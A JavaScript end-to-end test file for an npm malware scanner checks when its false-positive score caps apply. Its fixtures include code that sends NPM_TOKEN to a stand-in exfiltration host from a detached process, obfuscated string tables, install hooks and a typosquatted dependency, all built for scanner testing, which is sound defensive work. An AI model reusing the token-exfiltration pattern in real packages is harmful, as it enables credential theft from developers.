'use strict';

// End-to-end tests of contextual FP caps F3, F5, F6, F7 and F12 through the real CLI (MUADDIB_DEBUG=1
// prints the "[FP-CAP] ... <feature>" line; the JSON score is on stdout). F10 has its own
// file; F13 is covered end to end in tests/audit-2026-05/typosquat-findings.test.js.
// F11 (ai_agent_bot) is not covered here: its "agent runtime path" condition needs a finding
// whose message cites ~/.claude-style paths, which no plausible fixture produced; it keeps
// its unit tests in tests/unit/ml-feature-extractor.test.js.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const { asyncTest, assert, BIN, cleanupTemp } = require('../test-utils');

function scanCli(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-e2e-cap-'));
  try {
    for (const [rel, c] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
      fs.writeFileSync(path.join(dir, rel), typeof c === 'string' ? c : JSON.stringify(c, null, 2));
    }
    const r = spawnSync(process.execPath, [BIN, 'scan', dir, '--json'], {
      encoding: 'utf8',
      env: { ...process.env, MUADDIB_DEBUG: '1', MUADDIB_NO_REGISTRY_FETCH: '1' },
      maxBuffer: 1 << 26
    });
    const out = r.stdout || '';
    const json = JSON.parse(out.slice(out.indexOf('{')));
    const capLine = (r.stderr || '').split('\n').find(l => l.includes('[FP-CAP]')) || '';
    return { score: json.summary.riskScore, types: json.threats.map(t => t.type), capLine };
  } finally {
    cleanupTemp(dir);
  }
}

const show = s => `score=${s.score} cap="${s.capLine.trim()}" types=${[...new Set(s.types)].join(',')}`;

// A detached refresh process voids the MT-1 ceiling for credential flows, so the caps are
// observable (without it, MT-1 alone keeps a no-hook package at 35).
const postTo = (host, envVar) => [
  `const key = process.env.${envVar};`,
  'async function call() {',
  `  const res = await fetch('https://${host}/v1/messages', { method: 'POST', headers: { authorization: 'Bearer ' + key }, body: JSON.stringify({ key }) });`,
  '  return res.json();',
  '}',
  "require('child_process').spawn(process.execPath, [__filename, '--refresh'], { detached: true, stdio: 'ignore' }).unref();",
  'call().then(r => console.log(r));',
  ''
].join('\n');

async function runE2EFpCapTests() {
  console.log('\n=== E2E FP CAPS F3 / F5 / F7 ===\n');

  // ---- F3 network_destination_first_party ----
  await asyncTest('F3 E2E: vendor-scoped SDK posting its key to its own API -> capped (network_destination_first_party)', async () => {
    const s = scanCli({ 'package.json': { name: '@anthropic-ai/helper-x', version: '1.0.0', main: 'index.js' }, 'index.js': postTo('api.anthropic.com', 'ANTHROPIC_API_KEY') });
    assert(s.capLine.includes('network_destination_first_party') && s.score <= 30, show(s));
  });
  await asyncTest('F3 E2E: same scope, NPM_TOKEN sent by a detached process to a third-party host -> NOT capped (hijacked-scope shape)', async () => {
    const s = scanCli({ 'package.json': { name: '@openai/helper-x', version: '1.0.0', main: 'index.js' }, 'index.js': postTo('collector.example-exfil.net', 'NPM_TOKEN') });
    assert(!s.capLine.includes('network_destination_first_party'), show(s));
    assert(s.score >= 75, 'the exfil must keep its CRITICAL priority: ' + show(s));
  });
  await asyncTest('F3 E2E: no vendor identity -> F3 does not apply', async () => {
    const s = scanCli({ 'package.json': { name: 'helper-x', version: '1.0.0', main: 'index.js' }, 'index.js': postTo('api.anthropic.com', 'ANTHROPIC_API_KEY') });
    assert(!s.capLine.includes('network_destination_first_party'), show(s));
  });

  // ---- F5 typosquat_scoped_package: KNOWN LIMIT, pinned ----
  // In `muaddib scan`, typosquat_detected only concerns DEPENDENCIES, and scoped dependency
  // names never match (findTyposquatMatch skips "@..."). F5 therefore never handles the case
  // it was written for (a scoped name resembling a popular one); what it does is remove the
  // typosquat points of an unscoped dependency whenever the HOST package is scoped. On the
  // validation corpus that shields 127 scoped packages (122 FP_probable, 5 unresolved, 0 TP)
  // from dependency-typosquat noise, so it was kept; the cost is that anyone who creates a
  // scope gets the same reduction. This test pins the behavior so a change is deliberate.
  await asyncTest('F5 E2E (known limit): a dependency typosquat loses its points when the host package is scoped', async () => {
    const files = name => ({ 'package.json': { name, version: '1.0.0', main: 'index.js', dependencies: { expresss: '^4.0.0' } }, 'index.js': "require('expresss');\n" });
    const scoped = scanCli(files('@acme/app'));
    const plain = scanCli(files('acme-app'));
    assert(scoped.types.includes('typosquat_detected') && plain.types.includes('typosquat_detected'), show(scoped) + ' | ' + show(plain));
    assert(scoped.capLine.includes('typosquat_scoped_package') && !plain.capLine.includes('typosquat_scoped_package'), show(scoped) + ' | ' + show(plain));
    assert(scoped.score < plain.score, `scoped ${scoped.score} vs unscoped ${plain.score}`);
  });

  // ---- F7 placeholder_anti_dep_confusion ----
  // F7 only applies when no HIGH/CRITICAL finding exists, so the score it caps (MAX 20) is
  // made of MEDIUM/LOW findings; these tests assert that the cap applies, not a score drop.
  const placeholder = { name: 'internal-utils-x', version: '0.0.1', description: 'Placeholder package to prevent dependency confusion attacks', main: 'index.js' };
  await asyncTest('F7 E2E: declared dependency-confusion placeholder with only MEDIUM findings -> cap applies', async () => {
    const s = scanCli({ 'package.json': placeholder, 'index.js': "const v = process.env['K' + 1];\n" });
    assert(s.capLine.includes('placeholder_anti_dep_confusion') && s.score <= 20, show(s));
  });
  await asyncTest('F7 E2E: same placeholder description with an install hook -> cap does not apply', async () => {
    const s = scanCli({ 'package.json': { ...placeholder, scripts: { postinstall: 'node index.js' } }, 'index.js': "const v = process.env['K' + 1];\n" });
    assert(!s.capLine.includes('placeholder_anti_dep_confusion'), show(s));
  });
  await asyncTest('F7 E2E: same placeholder description with a HIGH finding -> cap does not apply', async () => {
    const s = scanCli({ 'package.json': placeholder, 'index.js': postTo('collector.example-exfil.net', 'NPM_TOKEN') });
    assert(!s.capLine.includes('placeholder_anti_dep_confusion') && s.score > 20, show(s));
  });

  // ---- F6 obfuscation_without_vector ----
  // Obfuscator.io-shaped output (rotated string table + index accessor) with no install, env
  // or network vector -> MAX 35. The obfuscated file alone scores below 35, so these tests
  // assert that the cap applies, not a score drop.
  const BS = String.fromCharCode(92);
  const table = Array.from({ length: 400 }, (_, i) =>
    "'" + BS + 'x' + (40 + (i * 7) % 50).toString(16) + BS + 'x' + (60 + (i * 3) % 30).toString(16) + "'").join(',');
  const obfuscated = 'var _0x1a2b=[' + table + "];(function(_0x3c,_0x4d){var _0x5e=function(_0x6f){while(--_0x6f){_0x3c['push'](_0x3c['shift']());}};_0x5e(++_0x4d);}(_0x1a2b,0x1f4));" +
    'var _0x7a=function(_0x8b){_0x8b=_0x8b-0x0;return _0x1a2b[_0x8b];};module.exports=_0x7a;\n';
  const obfPkg = scripts => ({ 'package.json': { name: 'protected-lib-x', version: '1.0.0', main: 'index.js', ...(scripts ? { scripts } : {}) }, 'index.js': obfuscated });
  await asyncTest('F6 E2E: obfuscated library with no install / env / network vector -> cap applies', async () => {
    const s = scanCli(obfPkg());
    assert(s.capLine.includes('obfuscation_without_vector') && s.score <= 35, show(s));
  });
  await asyncTest('F6 E2E: same obfuscated file run by an install hook -> cap does not apply', async () => {
    const s = scanCli(obfPkg({ postinstall: 'node index.js' }));
    assert(!s.capLine.includes('obfuscation_without_vector') && s.score > 35, show(s));
  });

  // ---- F12 vendor_minified_bundle ----
  // A minified framework bundle (>= 20 KB, .min.js) where >= 3 bundler-shaped heuristics fire
  // on the same file (template compilation via new Function / eval, a reactive Proxy that
  // syncs state, prototype patching) and no install hook -> MAX 25.
  const bundle = extra => '/* ' + 'x'.repeat(40 * 1024) + ' */\n' +
    "!function(e){var t=e.tpl,n=new Function('ctx','with(ctx){return '+t+'}');var o=eval(e.expr);" +
    "var s=new Proxy({},{set:function(o,k,v){o[k]=v;fetch('/api/state',{method:'POST',body:JSON.stringify({k:k,v:v})});return true}});" +
    'Object.prototype.__reactive=true;' + extra + 'e.out=[n,o,s];}(window.__cfg||{});\n';
  const bundlePkg = (code, scripts) => ({
    'package.json': { name: 'vendor-player-x', version: '1.0.0', main: 'lib/player.min.js', ...(scripts ? { scripts } : {}) },
    'lib/player.min.js': code
  });
  await asyncTest('F12 E2E: minified framework bundle, no install hook -> cap applies', async () => {
    const s = scanCli(bundlePkg(bundle('')));
    assert(s.capLine.includes('vendor_minified_bundle') && s.score <= 25, show(s));
  });
  await asyncTest('F12 E2E: same bundle run by an install hook -> cap does not apply', async () => {
    const s = scanCli(bundlePkg(bundle(''), { postinstall: 'node lib/player.min.js' }));
    assert(!s.capLine.includes('vendor_minified_bundle') && s.score > 25, show(s));
  });
  await asyncTest('F12 E2E: same bundle reading the registry token -> cap does not apply', async () => {
    const s = scanCli(bundlePkg(bundle('var tk=process.env.NPM_TOKEN;')));
    assert(!s.capLine.includes('vendor_minified_bundle') && s.score > 25, show(s));
  });
}

module.exports = { runE2EFpCapTests };
